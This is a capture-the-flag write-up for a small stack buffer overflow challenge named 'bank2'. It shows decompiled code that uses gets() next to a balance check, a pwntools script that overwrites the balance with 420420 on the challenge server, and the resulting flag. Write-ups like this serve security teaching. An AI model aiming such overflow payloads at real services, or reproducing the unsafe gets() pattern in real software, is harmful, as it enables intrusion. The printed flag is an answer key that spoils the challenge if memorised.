## bank2 (100 points)

#### Solved by hieplpvip

```
nc 61.28.237.24 30203

author: xikhud
```

Open `bank2` with IDA:

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0);
  Register();
  puts("[+] Good bye!");
  return 0;
}
```

```cpp
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch]
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Please enter your name: ");
  gets(name);
  printf("[+] Thanks for the registration, your balance is %d.\n", balance);
  if ( balance == 420420 )
    getFlag();
}
```

```cpp
void getFlag()
{
  system("cat flag.txt");
}
```

We use buffer overflow to overwrite `balance` with 420420 to pass the check:

```py
from pwn import *
conn = remote('61.28.237.24', 30203)
conn.sendlineafter("name:", b'a' * 64 + p32(420420))
conn.interactive()
```

**Flag:** `HCMUS-CTF{little_endian_is_fun}`
